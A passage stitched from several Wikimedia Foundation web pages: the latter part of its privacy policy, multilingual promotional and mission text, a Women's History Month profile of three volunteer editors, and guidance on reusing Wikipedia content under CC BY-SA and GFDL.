When we give access to Personal Information to third-party developers or researchers, we put requirements, such as reasonable technical and contractual protections, in place to help ensure that these service providers treat your Personal Information consistently with the principles of this Policy and in accordance with our instructions. If these developers or researchers later publish their work or findings, we ask that they not disclose your Personal Information. Please note that, despite the obligations we impose on developers and researchers, we cannot guarantee that they will abide by our agreement, nor do we guarantee that we will regularly screen or audit their projects. (You can learn more about re-identification in our FAQ.)

Back to top


BECAUSE YOU MADE IT PUBLIC



Information that you post is public and can be seen and used by everyone.

Any information you post publicly on the Wikimedia Sites is just that – public. For example, if you put your mailing address on your talk page, that is public, and not specifically protected by this Policy. And if you edit without registering or logging into your account, your IP address will be seen publicly. Please think carefully about your desired level of privacy before you disclose Personal Information on your user page or elsewhere.

Back to top





PROTECTION


HOW DO WE PROTECT YOUR PERSONAL INFORMATION?



We use a variety of physical and technical measures, policies, and procedures to help protect your Personal Information from unauthorized access, use, or disclosure.

We strive to protect your Personal Information from unauthorized access, use, or disclosure. We use a variety of physical and technical measures, policies, and procedures (such as access control procedures, network firewalls, and physical security) designed to protect our systems and your Personal Information. Unfortunately, there is no such thing as completely secure data transmission or storage, so we cannot guarantee that our security will not be breached (by technical measures or through violation of our policies and procedures).

We will never ask for your password by email (but may send you a temporary password via email if you have requested a password reset). If you ever receive an email that requests your password, please let us know by sending it to privacy@wikimedia.org, so we can investigate the source of the email.

Back to top



HOW LONG DO WE KEEP YOUR DATA?



Except as otherwise stated in this Policy, we only keep your Personal Information as long as necessary to maintain, understand and improve the Wikimedia Sites or to comply with applicable law.

Once we receive Personal Information from you, we keep it for the shortest possible time that is consistent with the maintenance, understanding, and improvement of the Wikimedia Sites, and our obligations under applicable law. In most instances, Personal Information is deleted, aggregated or de-identified after 90 days. Non-Personal Information may be retained indefinitely as appropriate. (Check out the list of examples in our FAQ.)

Please remember that when you make a contribution to any Wikimedia Site, the page history will show when your contribution was made, your username (if you are signed in), or your IP address (if you edit while not logged in). The transparency of the projects' contribution and revision histories is critical to their efficacy and trustworthiness. To learn more about our data retention practices, see our data retention guidelines.

Back to top



YOUR RIGHTS



If you would like to request access to or removal of your Personal Information, you may contact us.

For information about how you may request removal of your Personal Information, or other rights you may have with respect to your Personal Information, see our FAQ. If you would like to request to access, update or restrict/object to the processing of Personal Information, or receive a copy of your Personal Information for purposes of transmitting it to another organization, you may Contact Us. We will respond to your request consistent with applicable law.

Please note also that you may be able to exercise some of these rights without our intervention. For example, if you are a registered user, you can access and update some Personal Information in your Preferences, as well as download your user account data. You may also manage what kinds of notifications you receive and how often you receive them by going to your Notifications Preferences.

Back to top





IMPORTANT INFO

For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.




WHERE IS THE FOUNDATION & WHAT DOES THAT MEAN FOR ME?



The Wikimedia Foundation is a non-profit organization based in San Francisco, California, with servers and data centers located in the U.S. If you decide to use Wikimedia Sites, whether from inside or outside of the U.S., you understand that your Personal Information will be collected, transferred, stored, processed, disclosed and otherwise used in the U.S. as described in this Privacy Policy. You also understand that your information may be transferred by us from the U.S. to other countries, which may have different or less stringent data protection laws than your country, in connection with providing services to you.

Back to top



OUR RESPONSE TO DO NOT TRACK (DNT) SIGNALS



We are strongly committed to protecting users' Personal Information. Under this Policy, we may share your information only under particular situations, which you can learn more about in the "When May We Share Your Information" section of this Privacy Policy. In particular, we do not share your Personal Information for marketing purposes.

Because we protect all users in accordance with this Privacy Policy, we do not change our behavior in response to a web browser's "do not track" signal. For more information regarding Do Not Track signals and how we handle them, please visit our FAQ.

Back to top



CHANGES TO THIS PRIVACY POLICY



Substantial changes to this Policy will not be made until after a public comment period of at least 30 days.

Because things naturally change over time and we want to ensure our Privacy Policy accurately reflects our practices and the law, it may be necessary to modify this Privacy Policy from time to time. We reserve the right to do so in the following manner:

 * In the event of substantial changes, we will provide the proposed changes to our users in at least three (3) languages (selected at our discretion) for an open comment period lasting at least thirty (30) calendar days. Prior to the start of any comment period, we will provide notice of such changes and the opportunity to comment via the Wikimedia Sites, and via a notification on WikimediaAnnounce-L or a similar mailing list.
 * For minor changes, such as grammatical fixes, administrative or legal changes, or corrections of inaccurate statements, we will post the changes and, when possible, provide at least three (3) calendar days' prior notice via WikimediaAnnounce-L or similar mailing list.

We ask that you please review the most up-to-date version of our Privacy Policy. Your continued use of the Wikimedia Sites after any effective date of a subsequent version of this Privacy Policy constitutes acceptance of this Privacy Policy on your part.

KNOWLEDGE IS HUMAN. KNOWLEDGE IS HER.

MEET SOME OF THE HUMANS ENSURING MORE RELIABLE CONTENT ABOUT WOMEN EXISTS ON WIKIPEDIA.



The nonprofit Wikimedia Foundation provides the essential infrastructure for free knowledge. We host Wikipedia, the free online encyclopedia, created, edited, and verified by volunteers around the world, as well as many other vital community projects. All of which is made possible thanks to donations from individuals like you. We welcome anyone who shares our vision to join us in collecting and sharing knowledge that fully represents human diversity.

WIKIMEDIA PROJECTS BELONG TO EVERYONE

You made it. It is yours to use. For free. That means you can use it, adapt it, or share what you find on Wikimedia sites. Just do not write your own bio, or copy/paste it into your homework.



2


WE RESPECT YOUR DATA AND PRIVACY

We do not sell your email address or any of your personal information to third parties. More information about our privacy practices are available at the Wikimedia Foundation privacy policy, donor privacy policy, and data retention guidelines.

3


PEOPLE LIKE YOU KEEP WIKIPEDIA ACCURATE

Readers verify the facts. Articles are collaboratively created and edited by a community of volunteers using reliable sources, so no single person or company owns a Wikipedia article. The Wikimedia Foundation does not write or edit, but you and everyone you know can help.

4


NOT ALL WIKIS ARE WIKIMEDIA

The word “wiki” refers to a website built using collaborative editing software. Projects with no past or existing affiliation with Wikipedia or the Wikimedia Foundation, such as Wikileaks and wikiHow, also use the term. Although these sites also use “wiki” in their name, they have nothing to do with Wikimedia.

280,000+

editors contribute to Wikimedia projects every month

100+ million

media files on Wikimedia Commons and counting

1.5 billion

unique devices access Wikimedia projects every month


RESEARCH

We conduct our own research and partner with researchers worldwide to address change in society and technology.

TECHNOLOGY

From site reliability to machine learning, our open-source technology makes Wikipedia faster, more reliable, and more accessible worldwide.

ADVOCACY

We fight to protect everyone’s right to access free and open knowledge.

Editor since 2007, Wikimedia community

Throughout history, knowledge has been controlled by a powerful few. Wikipedia needs knowledge from all languages and cultures. The internet has become the default for accessing information—women, people of color, and the global south remain underrepresented. We invite you to help correct history.

أفراد مثلك هم من يحرصون على دقة ويكيبيديا

القراء يتولون مهمة التحقق من الحقائق. تنشئ المقالات بصفة تعاونية ويتولى تعديلها مجتمع من المتطوعين يستعينون بمصادر جديرة بالثقة، حتى لا يسيطر شخص واحد أو تتملك شركة بعينها أي من مقالات ويكيبيديا. لا تكتب مؤسسة ويكيميديا أو تعدل، إلا أنك أنت وجميع من تعرف يمكنهم المساهمة.

ليست كل مواقع الويكي تابعة لويكيميديا

كلمة «ويكي – wiki» تشير إلى موقع شبكي صمم باستخدام برمجيات تعديل تعاونية. توجد مشاريع ليس لها صلة سابقة أو قائمة بويكيبيديا أو مؤسسة ويكيميديا، مثل ويكيليكس وويكي هاو، تستخدم ذات المصطلح. رغم أن هذه المواقع تستخدم أيضا كلمة «ويكي – wiki» في اسمها، إلا أنها لا تمت بصلة بويكيميديا.

مؤسسة ويكيميديا تدعو إلى توفير اتصال غير مقيد بالإنترنت والوصول إلى المعرفة في غزة

Foundation

تعبّر مؤسسة ويكيميديا عن قلقها العميق إزاء قطع الإنترنت المستمر في قطاع غزة، والذي يعيق بشكلٍ مباشرٍ قدرة الناس على تلقّي المعلومات ومشاركتها من ويكيبيديا ومشاريع ويكيميديا الأخرى. باعتبارها منظمة غير ربحية تستضيف مشاريع ويكيميديا، تَعتبِر المؤسسة أن هذه الإغلاقات تشكّل تهديدًا لرسالتها المتمثّلة في نشر المعرفة على نطاقٍ عالمي وحماية الوصول إلى المعرفة كحق إنساني.

Vous les avez bâtis. Vous en disposez. Gratuitement. Cela signifie que vous pouvez utiliser, adapter et partager le contenu que vous trouvez sur les sites Wikimédia. Évitez simplement d’y rédiger votre biographie, ou de le copier-coller dans vos devoirs.



2


NOUS RESPECTONS VOS DONNÉES ET VOTRE VIE PRIVÉE

Nous ne vendons pas votre adresse e-mail ou toute autre donnée personnelle à des tiers. Vous trouverez plus d’informations sur nos pratiques en matière de protection de la vie privée dans la Politique de confidentialité de la Fondation Wikimédia, Politique de confidentialité des donateurs et les Directives de conservation des données.

WIKIPÉDIA EST FIABLE GRÂCE À DES GENS COMME VOUS

Les lecteurs vérifient les faits. Les articles sont créés et modifiés de façon collaborative par une communauté de bénévoles s’appuyant sur des sources fiables, une page Wikipédia n’appartient donc pas à une personne ou une entreprise en particulier. La Foundation Wikimédia ne rédige pas les articles ni ne les modifie, mais vous et quiconque vous connaissez peut aider.

4


TOUS LES WIKIS NE SONT PAS DES WIKIMÉDIA.

Le mot « wiki » fait référence à un site web construit à l’aide d’un logiciel d’édition collaboratif. Les projets sans affiliation antérieure ou actuelle avec Wikipédia ou la Fondation Wikimédia, tels que Wikileaks et wikiHow, utilisent également ce terme. Bien que ces sites utilisent également le préfixe “wiki” dans leur dénomination, ils n’ont rien à voir avec Wikimédia.

Tout au long de notre Histoire, le savoir a été aux mains d’une minorité de puissants. Wikipédia a besoin de connaissances venues de toutes les langues et de toutes les cultures. Internet est devenu le principal moyen d’accès à l’information, mais les femmes, les non-Blancs et les pays du sud y restent sous-représentés. Nous vous invitons à corriger l’Histoire.

AIDEZ-NOUS À RÉVÉLER LE SAVOIR DU MONDE.

Wikipédia et nos autres projets pour la liberté de la connaissance sont non lucratifs et vivent principalement de vos dons.

Некоммерческий Фонд Викимедиа предоставляет ключевую инфраструктуру для свободных знаний. На наших серверах размещается Википедия — свободная онлайн энциклопедия, создаваемая, редактируемая и проверяемая добровольцами со всего мира, — а также многие другие важнейшие проекты сообщества. Все это стало возможным благодаря пожертвованиям таких людей, как вы. Мы приглашаем всех, кто разделяет наше видение, присоединиться к нам в сборе и распространении знаний, которые в полной мере представляют разнообразие человечества.

ПРОЕКТЫ ВИКИМЕДИА ПРИНАДЛЕЖАТ ВСЕМ

Вы создали их. Они ваши, и ими можно пользоваться. Бесплатно. Это означает, что вы можете пользоваться этими материалами, менять их, или поделиться тем, что вы найдете на сайтах Викимедиа. Просто не пишите здесь свою автобиографию и не выдавайте наши материалы за своё домашнее задание.

2


МЫ УВАЖАЕМ ВАШИ ДАННЫЕ

Мы не продаём третьим лицам ваш адрес электронной почты или любые ваши персональные данные. Более подробно о нашей практике обращения с вашими конфиденциальными данными можно узнать из политики конфиденциальности Фонда Викимедиа, политики конфиденциальности дарителей, а также из руководства по сохранению данных.

ТОЧНОСТЬ ВИКИПЕДИИ ПОДДЕРЖИВАЮТ ТАКИЕ ЖЕ ЛЮДИ, КАК И ВЫ

Читатели проверяют факты. Статьи совместно создаются и редактируются сообществом добровольцев с использованием надёжных авторитетных источников, поэтому никакой человек и никакая компания не владеет какой-либо статьёй Википедии. Фонд Викимедиа не пишет и не редактирует статьи, но другие могут помочь.

4


НЕ ВСЕ ВИКИ-САЙТЫ ОТНОСЯТСЯ К ВИКИМЕДИА

Слово «вики» означает веб-сайт, созданный с использованием программного обеспечения для совместного редактирования. Проекты, ранее или в настоящем времени не связанные с Википедией или Фондом Викимедиа, такие как «Wikileaks» и «wikiHow», также используют этот термин. Хотя эти сайты также используют «вики» в своем названии, они не имеют никакого отношения к Викимедиа.

На протяжении всей истории человечества знания контролировались немногочисленными группами власть имущих. Википедии нужны знания всех языков и культур. Интернет стал базовым средством доступа к информации — однако женщины, люди с разным цветом кожи и жители «глобального Юга» остаются слабо представленными в нём. Мы приглашаем вас помочь исправить историю.

LOS PROYECTOS WIKIMEDIA LE PERTENECEN A TODOS

Tú la hiciste. Está a tu disposición. Gratis. Eso significa que puedes utilizarla, adaptarla o compartir lo que encuentres en los sitios Wikimedia. Sólo no escribas tu propia biografía o la copies y pegues en tu tarea.



2


RESPETAMOS TUS DATOS

No vendemos tu dirección de correo electrónico ni cualquier información personal a terceros. Más información sobre nuestras prácticas de privacidad está disponible en política de privacidad de la Fundación Wikimedia, política de privacidad de donantes, directrices de retención de datos.

3


GENTE COMO TÚ MANTIENE LA VERACIDAD DE WIKIPEDIA

Los lectores verifican los datos. Los artículos se crean y se editan de manera colaborativa por una comunidad de voluntarios que usan fuentes confiables, así que ninguna persona o compañía es dueña de un artículo de Wikipedia. La Fundación Wikimedia no escribe o edita, pero otros pueden ayudar.

4


NO TODAS LAS WIKIS SON WIKIMEDIA

La palabra “wiki” hace referencia a un sitio web construido a partir de software colaborativo de edición. Otros proyectos que no tienen afiliación pasada o presente con Wikipedia o la Fundación Wikimedia, como por ejemplo Wikileaks y wikiHow también utilizan el término. Aunque esos sitios también usan la expresión “wiki” en su nombre, no tienen ningún vínculo con Wikimedia.

A lo largo de la historia, el conocimiento ha sido controlado por unas cuantas personas con poder. Wikipedia necesita conocimiento de todos los idiomas y todas las culturas. El Internet se ha convertido en el acceso predeterminado a la información—mujeres, personas de color y el hemisferio sur siguen subrepresentadas. Te invitamos a ayudar a corregir la historia.

WIKIMEDIA-PROJEKTE GEHÖREN JEDEM

Du produzierst es. Es ist deines zum Verwenden. Umsonst. Das bedeutet, dass du verwenden kannst, anpassen kannst oder teilen kannst, was du auf Wimedia-Sites findest. Schreibe nur nicht deine eigene Biographie oder füge nicht etwas mit Copy und Paste in deine Hausarbeit ein.



2


WIR RESPEKTIEREN DEINE DATEN UND DEINE PRIVATSPHÄRE

Wir verkaufen deine E-Mail-Adresse oder irgendwelche deiner persönlichen Informationen nicht an Dritte. Weitere Informationen über unsere Privacy-Richtlinien gibt es auf Wikimedia Foundation privacy policy, donor privacy policy und data retention guidelines.

MENSCHEN WIE DU SORGEN FÜR DIE RICHTIGKEIT DER WIKIPEDIA

Leser prüfen die Fakten. Artikel werden kollaborativ erstellt und bearbeitet, von einer Community von Freiwilligen, die zuverlässige Quellenverwenden, so dass keine Einzelperson oder Firma einen Wikipedia-Artikel besitzt. Die Wikimedia Foundation schreibt oder bearbeitet nicht, aber du und alle anderen, die du kennst, können helfen.

4


NICHT ALLE WIKIS GEHÖREN ZUR WIKIMEDIA

Das Wort “wiki” bezieht sich auf eine Website, die mit Software erstellt wurde, die kollaboratives Bearbeiten ermöglicht. Den Begriff verwenden auch Projekte, die keine Verbindung zur Wikipedia oder zur Wikimedia Foundation hatten oder haben, wie zum Beispiel Wikileaks und wikiHow. Obwohl diese Sites “wiki” in ihrem Namen führen, haben sie nichts mit Wikimedia zu tun.

Our Work


WE HELP EVERYONE SHARE IN THE SUM OF ALL KNOWLEDGE.

We are the people who keep knowledge free. There is an amazing community of people around the world that makes great projects like Wikipedia. We help them do that work. We take care of the technical infrastructure, the legal challenges, and the growing pains.


HOST FREE KNOWLEDGE PROJECTS

The Wikimedia Foundation was established as a nonprofit in 2003 to give Wikipedia a permanent home. We now host 14 collaborative free knowledge projects, from Wikipedia, the free encyclopedia, to Wikidata, a set of structured data, and more. We maintain the servers, build the software, and design the technology that keep these projects running.


DELIVER GRANTS FOR GOOD

We partner with Wikimedia communities around the world to provide them with the support they need to do great work. Last year we awarded over 9 million USD in grants to Wikimedia community members, affiliates and nonprofit organizations. We fund editathons, outreach efforts, events, and conferences. We help them get the word out for free knowledge.


GROW COMMUNITY AROUND THE WORLD

When more people can access and contribute to free knowledge, the better that knowledge reflects the world. We are committed to helping grow and sustain a healthy community of over 220,000 people across 170 nations. From the community health initiative to ORES and our work in gender diversity, the Foundation is actively working to make our projects more inclusive.


SUPPORT EDUCATION AND LEARNING WORLDWIDE

We help teachers and students of all ages access and use the full potential of Wikimedia projects for their learning objectives. Key pillars of our education work include promoting knowledge equity and teaching 21st century skills.


PARTNER FOR CHANGE

Working with partners like Google, the Biodiversity Heritage Library, and UNESCO, Wikimedia actively seeks new knowledge, closing systemic gaps in global understanding of science, culture, language, and identity. The Wikipedia Library partners the world’s top publishers with Wikipedia.


OPEN THE KNOWLEDGE

“Open the Knowledge” is our call to everyone to promote radical knowledge equity, creating a living record of history, stories, and contexts for and by all people. It aims to make the Wikimedia movement more diverse, equitable, and inclusive.


HELP US UNLOCK THE WORLD’S KNOWLEDGE.

As a nonprofit, Wikipedia and our related free knowledge projects are powered primarily through donations.

Research


WE FIND WAYS TO MAKE WIKIMEDIA BETTER.

Our goal is to make Wikimedia sites more useful for people seeking knowledge across the globe. Research helps us live up to our mission. We turn research questions into opportunities to empower new readers and contributors. We use research-backed insights to inform new technologies, products, and programs. We partner with researchers around the world to better understand knowledge making and sharing.


BUILDING A POSITIVE COMMUNITY CULTURE

Harassment is a pervasive issue on the internet—even on Wikipedia. We’re working to understand and combat harassment in Wikimedia projects and discussion spaces.


IMPROVING SOURCES AND CITATIONS

Verifiable citations are critical to open knowledge projects like Wikipedia. We are building an open repository of sources to make it easier to manage citations.


UNDERSTANDING READER BEHAVIOR

Every second 6,000 people visit Wikipedia. We want to know why. Our research aims to understand their motivations and needs so we can identify opportunities to improve.


INCREASING EDITOR DIVERSITY

Wikimedia is a global movement but participation has been easier for some users than others. We are partnering with communities to understand why. With everyone’s help we can increase editor diversity across our projects.


HELPING NEW EDITORS

Learning how to contribute to Wikimedia projects can be complex. We worked with new editors in South Korea and the Czech Republic to understand why they edit and how we could make it easier.


PROTECTING THE OPEN INTERNET

The law should allow internet platforms to stay out of editorial decisions so that people can share and speak freely. We research how policies affect the way information is shared online.


PARTNERS HELP US TACKLE CHALLENGING RESEARCH PROJECTS.

We work with researchers from institutions such as EPFL, Cornell University, Google Jigsaw, Stanford University, and the University of Minnesota.

61+ million

articles across over 300 languages on Wikipedia

WELCOME TO WIKIPEDIA! HERE’S WHAT WE’RE DOING TO HELP YOU STICK AROUND

Research Wikipedia

Someone signing up to edit a Wikipedia page for the first time may feel a bit like a visitor to a new planet—excited, to be sure, but wildly overwhelmed. Many new editors must wonder: Just how many millions of articles are in this vast online resource? And which of those millions of articles need that….

But editors aren’t the only contributors to Wikipedia, WikiCommons, and the other Wikimedia projects: there are many other volunteers who contribute by organizing events and inspiring others to join our volunteer community. Their work,….

Advocacy


WE PROTECT THE RIGHT TO FREE KNOWLEDGE.

Everyone, everywhere has the right to access and share knowledge. By working with Wikimedia volunteers and affiliate organizations around the world, we protect free and open knowledge online, the people who make it possible, and our shared values.


DEFENDING FREE EXPRESSION

We defend everyone’s right to access free knowledge. We protect free expression rights; oppose government-imposed censorship; and educate governments, regulators, and lawmakers to defend people’s right to access and share knowledge globally.


ADVANCING BETTER INTERNET REGULATIONS

We help lawmakers support the right of online platforms and communities to create and share knowledge. We advocate laws that protect our ability to host content that Wikimedia volunteers share and edit. We are transparent about how we handle government demands to remove content or share data.


PROMOTING OPEN COPYRIGHT LICENSES

Creating and remixing content is vital for Wikimedia projects. We support copyright laws that promote a strong public domain and enable the use of free and open licenses so Wikimedia volunteers can contribute to knowledge broadly.


UPHOLDING HUMAN RIGHTS

Volunteers may face surveillance, harassment, and retaliation for their work on Wikimedia projects. We defend their human rights, and we work to promote a safe online environment to create and share knowledge.


PROTECTING PRIVACY

Privacy enables people to engage and share knowledge freely, without fear of someone watching their online lives. We defend everyone’s right to privacy and challenge mass surveillance.


FIGHTING DISINFORMATION

We stand for the right of everyone, everywhere to participate in free knowledge. In early 2022, when sanctions were imposed against the Russian government for invading Ukraine, we worked with our partners to make sure the Russian people could continue to access the open internet.

Learn more about our work, including research initiatives and how to get involved.

Technology


WE KEEP WIKIMEDIA PROJECTS FAST, RELIABLE, AND AVAILABLE TO ALL.

From hosting Wikipedia to creating edit-checking artificial intelligence (AI), we design and build the open-source technology that powers Wikimedia projects. Community volunteers and Foundation technologists collaborate on MediaWiki, the platform that makes sharing free knowledge possible.


HOSTING THE WORLD’S KNOWLEDGE

Wikipedia is one of the top most-visited websites in the world, accessed by 1.5 billion unique devices every month. Our infrastructure keeps it online.


MAKING WIKIPEDIA EASIER TO USE

Through technical and design improvements to Wikipedia’s desktop and more, we make the site easier to use and more welcoming for readers and contributors alike.


ASSISTING HUMAN COLLABORATION WITH MACHINE LEARNING

Anyone can edit Wikipedia, and it can be challenging to maintain quality control. That is why we made ORES, an artificial intelligence service that automatically identifies potentially problematic content as soon as it appears, advising editors if changes are needed.


HELPING NASA

NASA’s internal wiki for collaboration and documentation is built on MediaWiki, just like Wikipedia. We create MediaWiki—open-source wiki software that is free and available for anyone.


MENTORING NEW DEVELOPERS

To help build a more diverse and inclusive technical community, the Wikimedia Foundation funds, supports, and mentors new developers and underrepresented groups in tech.


GROWING A VOLUNTEER DEVELOPER COMMUNITY

Over half of the commits made to our codebase are pushed by volunteers. We actively support a thriving volunteer technology community, with grants, events, and an open collaboration tool.

LEARN SOMETHING NEW. CONTRIBUTE WHAT YOU KNOW.

Wikimedia projects are made by volunteers. Like you.

Editors contribute new articles and improve current articles. Developers write and debug the code that makes the wikis go. Galleries, libraries, archives, and museums share their collections and expertise. All of us have knowledge to share. Here’s how to join our global community.

KNOWLEDGE IS HUMAN, KNOWLEDGE IS HER


KNOWLEDGE IS HUMAN.
KNOWLEDGE IS HER.




Wikipedia is the largest encyclopedia in human history. Its more than 64 million articles are the result of generous contributions from hundreds of thousands of Wikimedians, which is the name given to volunteer editors who have written, edited, cited trustworthy sources, and fact checked every single page. All are invited to share their knowledge—and the more humans take part, the more representative of the real world and diverse perspectives Wikipedia becomes. Because knowledge is, inherently, human.

This International Women’s Day, and throughout Women’s History Month, we are celebrating volunteers whose thousands of edits about notable women have improved the reliability of the Wikipedia you know and love. Join us in honoring these generous volunteers who embody this idea that knowledge is her.



User:Cmwaura, Kenya
Wikimedian since 2020
Contributions: 2,248 edits, 594 Wikidata edits
As of February 2025




CAROL MWAURA

With over 2,000 edits across Wikipedia and its sister projects, Carol is working to increase the amount of reliable articles about women on the free encyclopedia, all while supporting and inspiring the next generation of editors.

Methodical about her approach, perhaps in part to being a librarian, User:Cmwaura begins every “Wiki assignment” by identifying content gaps, researching reliable sources, cross-checking references, and adhering to citation guidelines.

Editing quickly became her calling, specifically making information about Kenyan women more available to everyone. That is also why she translates articles into Swahili, which is spoken by 95% of the population in Kenya.

Carol’s contributions have not gone unnoticed by her peers. During the #1Lib1Ref campaign in 2020, a campaign that invites librarians all over the world to add references to Wikipedia, her numerous contributions led fellow volunteers to name her one of the top 100 editors in Africa and one of the top women editors in Kenya. Her dedication is unparalleled, and she often edits on the go, while chasing an internet signal.

User:Olugold, Nigeria
Wikimedian since 2019
Contributions: 16,859 edits, 119 pages created on English Wikipedia, 788 pages created on Igbo Wikipedia
As of February 2025




GOODNESS IGNATIUS

Goodness has created over 800 new Wikipedia articles in English and Igbo and made over 16,000 Wiki contributions overall, helping to make content about women-related issues, Nigerian issues, and the Igbo language freely available. She is a prolific editor who is active across a myriad of Wikimedia projects.

In addition to writing, Goodness coordinates events on Meta-Wiki for both new and existing volunteers who want to learn how to contribute; she organizes data points on Wikidata that can be used to add reliable information across different sites, including  Wikipedia, Wikiquote (a collaborative collection of quotes), and Wiktionary, often in Igbo, increasing the availability of information in that language.

A librarian by trade, Goodness focuses on sharing much of the knowledge she has gathered over the years, like the article she created on the Igbo word Ọmụgwọ. Goodness also helps the next generation of Wikipedians in Nigeria feel confident about contributing to the free encyclopedia via their mobile phones.

User:aimeabibis, Benin
Wikimedian since 2021
Contributions: 9,496 edits, 278 new pages created
As of February 2025




ABIGAÏL AGBENOMBA

Since 2021, Abigail (User:aimeabibis) has been working tirelessly to make free knowledge accessible for everyone. She has made over 9,000 contributions across Wikimedia projects, including the creation of over 270 new articles on French Wikipedia, making free, reliable knowledge more accessible for speakers of that language. Her work spans a wide variety of topics, from pop culture, such as the article about Beninois-German singer-actress Victoire Laly, to politics, including an article on Beninois diplomat Arlette Dagnon Vignikin.

The sense of participating in something as big and meaningful as Wikipedia is one of the reasons why she feels inspired to contribute. Besides writing, Abigail finds the time to engage and organize events where she offers training, hosts workshops, and inspires more people to edit Wikipedia. Promoting gender equality, especially within the local Benin volunteer community, is something that’s near and dear to her heart.

Recently, her work with the “Gender Equality in Benin” campaign involved trying new strategies to engage more women volunteers. As part of this, they set up and ran a WhatsApp community to facilitate their involvement, with incredible results: Together the group created 660 new articles and improved 1,150 existing pages on Wikipedia.

There are many reusers of Wikipedia's content, and more are welcome. If you want to use Wikipedia's text materials in your own books/articles/web sites or other publications, you can generally do so, but you must comply with one of the licenses that Wikipedia's text is licensed under. Many of the media files on Wikipedia are also reusable. Each media file has its own licensing statement which must be verified, and reuse of any media file must comply with its licensing.

Neither the Wikimedia Foundation nor the authors of material on Wikimedia sites provide legal advice. Wikipedia is primarily subject to U.S. law; re-users outside the U.S. should be aware that they are subject to the laws of their country. It is the responsibility of the reuser to determine how a license applies to the intended reuse. Additionally, while this document addresses copyright, other restrictions may apply. These may include personality rights, moral rights, privacy rights, or any of the many other legal causes which are independent of copyright and vary greatly by jurisdiction. If you have any questions about your intended reuse, you may wish to consult with an attorney licensed to practice in your area.

The GFDL imposes different requirements, which are dictated in the text of the license. The English text of these licenses is the only legally binding document; what follows is our interpretation of how material may be reused under them.


RE-USE OF TEXT UNDER CREATIVE COMMONS ATTRIBUTION-SHAREALIKE

Attribution To re-distribute a text page in any form, provide credit to the authors either by including a) a hyperlink (where possible) or URL to the page or pages you are re-using, b) a hyperlink (where possible) or URL to an alternative, stable online copy which is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on this website, or c) a list of all authors. (Any list of authors may be filtered to exclude very small or irrelevant contributions.) This applies to text developed by the Wikipedia community. Text from external sources may attach additional attribution requirements to the work, which should be indicated on an article's face or on its talk page. For example, a page may have a banner or other notation indicating that some or all of its content was originally published somewhere else. Where such notations are visible in the page itself, they should generally be preserved by re-users. Copyleft/Share Alike If you make modifications or additions to the page you re-use, you must license them under the Creative Commons Attribution-Share-Alike License 4.0 or later. Indicate changes If you make modifications or additions, you must indicate in a reasonable fashion that the original work has been modified. If you are re-using the page in a wiki, for example, indicating this in the page history is sufficient. Licensing notice Each copy or modified version that you distribute must include a licensing notice stating that the work is released under CC BY-SA and either a) a hyperlink or URL to the text of the license or b) a copy of the license. For this purpose, a suitable URL is: http://creativecommons.org/licenses/by-sa/4.0/

For further information, please refer to the legal code of the CC BY-SA License.


RE-USE OF TEXT UNDER THE GNU FREE DOCUMENTATION LICENSE

For compatibility reasons, any page which does not incorporate text that is exclusively available under CC BY-SA or a CC BY-SA-compatible license is also available under the terms of the GNU Free Documentation License. In order to determine whether a page is available under the GFDL, review the page footer, page history, and discussion page for attribution of single-licensed content that is not GFDL-compatible. All text published before June 15th, 2009 on Wikipedia was released under the GFDL, and you may also use the page history to retrieve content published before that date to ensure GFDL compatibility.

If you are simply duplicating the Wikipedia article, you must follow section two of the GFDL on verbatim copying, as discussed at Wikipedia:Verbatim copying under the GFDL.

If you create a derivative version by changing or adding content, this entails the following:

 * your materials in turn have to be licensed under GFDL,
 * you must acknowledge the authorship of the article (section 4B), and
 * you must provide access to the "transparent copy" of the material (section 4J). (The "transparent copy" of a Wikipedia article is any of a number of formats available from us, including the wikitext, the HTML web pages, the XML dump, etc.)

You may be able to partially fulfill the latter two obligations by providing a conspicuous direct link back to the Wikipedia article hosted on this website. You also need to provide access to a transparent copy of the new text. However, please note that the Wikimedia Foundation makes no guarantee to retain authorship information and a transparent copy of articles. Therefore, you are encouraged to provide this authorship information and a transparent copy with your derived works.


EXAMPLE NOTICE

An example notice, for an article that uses the Wikipedia article Metasyntactic variable under CC BY-SA, might read as follows:

This article uses material from the Wikipedia article <a href="https://en.wikipedia.org/wiki/Metasyntactic_variable">"Metasyntactic_variable"</a>, which is released under the <a href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-Share-Alike License 4.0</a>.


("Metasyntactic variable" and the Wikipedia URL must of course be substituted accordingly, and you should replace the link https://creativecommons.org/licenses/by-sa/4.0/ to point to a local copy of the CC BY-SA 4.0 text on your server.)

Alternatively you can distribute your copy of "Metasyntactic variable" along with a copy of the CC BY-SA 4.0 (as explained in the text) and list at least five (or all if fewer than five) principal authors on the title page (or top of the document). The external Authorship tool can help you identify the principal authors.

If you are reusing content on a wiki running the MediaWiki software, you can also create licensing notices with a template. This has the advantage of making notices easy to reuse on different pages. For example, you might use a template like Template:En-WP attribution notice, with the code {{En-WP attribution notice|Metasyntactic variable}}, to produce a notice similar to this:

This article uses material from the Wikipedia article Metasyntactic variable, which is released under the Creative Commons Attribution-ShareAlike 4.0 International License (view authors).


IMAGES AND OTHER MEDIA

While in principle Wikipedia's text is subject to the Creative Commons Attribution-ShareAlike License and, generally, the GNU Free Documentation License and can be used free of charge for any purpose so long as licensing terms are met, other media (including images) are sometimes identified as being subject to other licenses. Each media file has its own information page which includes source and licensing information. Clicking on the media file will lead to this information page. Many media files are free to use as long as you follow the terms of the licenses applied to them. From the information page, to download an individual free image, first right-click "Full resolution‎" or the linked name of the image. Next, choose to save the image (exact option depends on browser). A brief overview of some of the licenses that may be applied to media on Wikipedia is visible at Wikipedia:Image copyright tags. Additional information may be found at Commons:Licensing. However, neither the Wikimedia Foundation nor the authors of material on Wikimedia sites provide legal advice. It is the responsibility of the reuser to determine how a license applies to the intended reuse.

Media file information pages sometimes include contact information for copyright holders. If the licensing conditions of a media file are unsuitable for the reuse intended, it may be possible to contact the copyright holder of the media file for alternate conditions. This will need to be negotiated with the copyright holder directly.


FAIR USE MATERIALS AND SPECIAL REQUIREMENTS

All original Wikipedia text is distributed under the GFDL and CC BY-SA licenses. Occasionally, Wikipedia articles may include images, sounds, or text quotes used under the "fair use" doctrine of United States law. It is preferred that these be obtained under the most free (libre) license (such as the freely licensed or public domain) practical. In cases where no such images/sounds are currently available, then fair use images are acceptable (until such time as free images become available).

